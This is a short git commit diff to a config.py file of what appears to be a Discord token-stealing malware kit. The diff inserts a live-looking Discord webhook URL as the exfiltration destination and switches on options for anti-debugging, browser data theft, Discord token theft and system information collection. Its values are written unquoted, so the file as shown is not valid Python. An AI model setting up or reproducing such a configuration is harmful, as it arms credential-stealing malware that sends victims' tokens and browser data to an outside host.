14406fff27a3eade1ed408520728f1f0136a71d2
SNUS938 <secret1313mill@gmail.com>
2025-02-26 15:38:53 +0100

    Update config.py

--- api/config.py
+++ api/config.py
@@ -1,9 +1,9 @@
 __CONFIG__ = {
-    'webhook' : None,
-    'antidebug' : False,
-    'browsers' : False,
-    'discordtoken' : False,
+    'webhook' : https://discord.com/api/webhooks/1344034327972806758/kv2t9LHhQLNfAjYlP0ja3SPNWA8JtiRNtOw2x4ZKKhzS4L5WawnMz2IArapf-p70VaVh,
+    'antidebug' : yes,
+    'browsers' : yes,
+    'discordtoken' : yes,
     'injection' : False,
     'startup' : False,
-    'systeminfo' : False,
+    'systeminfo' : yes,
 }
